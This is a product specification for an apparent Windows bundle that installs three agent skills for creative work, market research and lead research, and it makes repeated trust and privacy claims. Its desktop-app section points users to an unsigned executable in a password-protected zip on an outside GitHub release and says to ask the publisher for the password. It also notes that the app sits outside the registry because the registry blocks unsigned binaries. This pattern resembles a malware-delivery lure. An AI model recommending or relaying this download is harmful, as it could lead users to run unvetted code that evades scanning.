# Windows Multi-Tool Suite - product specification

> What this bundle is, what it runs today, and how the desktop app reaches you.
> Every claim here is verifiable in this repository. No user counts, no
> performance numbers, no pricing that does not exist.

## One-line pitch

One Windows setup for the three workflows a US small business keeps paying for
separately: creative production, market research, and lead research.

## Why it exists

Marketing, research, and sales work gets bought as five different tools. The
context moves between them and somebody has to hold the whole pipeline in their
head. The three skills in this catalog already do the work as agent skills. This
bundle is the Windows path around them: one setup script, one launcher, one
config file, no terminal gymnastics.

## What ships today

### The Windows kit (this bundle)

- `scripts/setup.ps1` - idempotent setup: checks the machine, creates the
  workspace, writes `config.json`, installs the three catalog skills through the
  ClawHub CLI when it is present, and leaves a Start Menu shortcut.
- `scripts/MultiTool.ps1` - launcher menu for the three workflows.
- `scripts/verify_install.py` - health check: OS, architecture, Python, config
  file, installed skills. Run it any time, it changes nothing.
- `config.example.json` - the settings file the setup writes for you.
- `references/install-and-verify.md` - install, verify, troubleshoot.
- `references/faq.md` - the questions buyers actually ask.
- `templates/feature-matrix.md` - what the kit, the agent skills, and the
  desktop app each cover.

### The three workflows (separate skills, same catalog)

| Module | Skill | What it does |
| --- | --- | --- |
| Creative Studio | `ai-creative-studio` | Brief to ad copy, social posts, UGC scripts, image and video prompts, brand voice kit |
| Market Research | `ai-trading` | US equity and ETF snapshots, technicals, fundamentals, sector context, backtests, risk-first position sizing, written trade plans |
| Lead Research | `b2b-lead-research-agent` | ICP builder, company research, scored prospect lists, outreach drafts, CAN-SPAM linting |

The Windows kit does not reimplement them. It installs and launches them.

## The desktop app

**Windows Multi-Tool Suite app (`multitool.zip`), a separate download.** It
lives outside the registry, on the publisher's GitHub release:

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the hash before you unpack it. The program is not code-signed, so
Windows shows *Unknown publisher*. The installer asks for a password; ask the
publisher for it.

No skill bundle in this catalog carries the app. A registry blocks a skill
that ships an unsigned binary, so the workflow skills here are the
text-and-script version of the workflows. This bundle does not install the
app either; it installs the three skills.

## Boundaries

The suite never does these, in any tier, at any price:

- Place an order in a brokerage account. Research and sizing end at a written
  plan and a human approval step.
- Send email or messages on your behalf. Outreach is drafted and linted; a
  human sends it.
- Buy lists, scrape personal data, or use leaked and breach-derived data.
- Claim results, returns, or uptime numbers that are not measured and published.
- Run an installer that pipes a download into a shell. The kit is text you can
  read before you run it.

## Privacy and data

- The kit runs on your machine. Files it writes stay in your workspace.
- API keys live in your own `config.json` or environment variables. The kit
  never sends them anywhere except the provider you configured.
- No telemetry. No usage ping. There is no phone-home code in this bundle.
- The three workflows read public business sources and public market data.
  Anything you point them at stays local.

## Requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 build 1809 or later, Windows 11, 64-bit |
| PowerShell | 5.1 or later (built into Windows) |
| Python | 3.9 or later, for the workflow scripts |
| Node | 18 or later, only if you use the ClawHub CLI to install the skills |
| Disk | Under 50 MB for the kit; the skills themselves are text |
| Admin | Not required. The setup writes only to your user profile |

## Support

- Issues: the publisher's GitHub page (`links.json` -> `support_page`).
- Hours: US business hours, ET.
- The kit is MIT-0 licensed as a document. The skills it installs carry their
  own licenses.
